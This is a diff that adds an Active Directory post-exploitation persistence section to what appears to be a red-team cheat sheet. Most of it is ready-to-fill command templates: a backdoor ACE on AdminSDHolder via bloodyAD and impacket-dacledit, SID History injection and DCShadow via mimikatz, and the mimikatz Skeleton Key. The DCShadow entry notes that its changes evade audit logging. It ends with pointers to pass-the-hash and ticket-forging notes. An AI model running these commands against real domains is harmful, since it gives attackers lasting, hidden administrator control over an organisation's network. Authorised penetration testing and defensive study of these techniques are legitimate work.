@@ -45,3 +45,70 @@ nxc ldap <DC> -u <user> -p '<pass>' -M laps
 # Delegation rights
 impacket-findDelegation '<dom>/<user>:<pass>' -dc-ip <DC>
 ```
+
+## Persistence Techniques (post-exploitation)
+
+### AdminSDHolder Persistence
+SDProp propagates AdminSDHolder's ACL to all protected groups (Domain Admins,
+Enterprise Admins, etc.) every 60 minutes. Add a backdoor ACE to
+AdminSDHolder → it auto-reappears on every protected object.
+```bash
+# Add GenericAll for attacker user on AdminSDHolder
+bloodyAD --host <DC> -d <dom> -u <U> -p '<P>' add genericAll \
+  'CN=AdminSDHolder,CN=System,DC=<d1>,DC=<d2>' <attacker>
+
+# Or via impacket dacledit
+impacket-dacledit -action write -rights FullControl -principal <attacker> \
+  -target-dn 'CN=AdminSDHolder,CN=System,DC=<d1>,DC=<d2>' '<dom>/<U>:<P>'
+```
+Wait ~60 min (or trigger SDProp manually), then <attacker> has GenericAll
+on Domain Admins, Account Operators, etc.
+
+### SID History Injection
+Add a privileged SID (e.g., Domain Admins) to a user's `sIDHistory`. The SID
+is included in the Kerberos PAC on logon → instant DA-equivalent access
+without being in the group. Requires DA-level or DCSync access.
+```bash
+# Get Domain Admins SID
+impacket-lookupsid '<dom>/<U>:<P>@<DC>' | grep 'Domain Admins'
+# -> S-1-5-21-...-512
+
+# Inject via mimikatz (from DC with local admin)
+mimikatz # sid::add /sam:<target-user> /new:<DA-SID>
+
+# Or via dsmod (from DC PowerShell)
+# Requires direct DC access; no pure remote tool
+```
+
+### DCShadow
+Register a rogue DC via DRS replication to push arbitrary AD changes
+(attribute modifications, SPN injection, SID History, etc.). Requires
+DA-level access to register the fake DC.
+```bash
+# Terminal 1: start the fake DC (requires SYSTEM on domain-joined machine)
+mimikatz # lsadump::dcshadow /object:<target-user> /attribute:description /value:"owned"
+
+# Terminal 2: push the replication
+mimikatz # lsadump::dcshadow /push
+```
+Use for stealthy persistence — changes bypass normal AD audit logging.
+
+### Skeleton Key
+Inject a master password into LSASS on a DC. Every account authenticates with
+EITHER its real password OR the skeleton key (`mimikatz` by default). Cleared
+on DC reboot.
+```bash
+# From DA shell on DC
+mimikatz # misc::skeleton
+# Now any account authenticates with password "mimikatz"
+
+# Remote via impacket (with DA creds)
+# No native remote skeleton key; requires code exec on DC first
+```
+
+## Cross-references (keyword activation)
+- **Pass-the-Hash (PtH)**: see `@windows` lateral-movement.md — Evil-WinRM
+  `-H`, impacket `-hashes`, nxc `-H`
+- **Golden Ticket / Silver Ticket / Diamond Ticket**: see `@ad` kerberos.md
+  for ticket forging commands
+- **Pass-the-Ticket (PtT)**: see `@ad` kerberos.md — `export KRB5CCNAME`
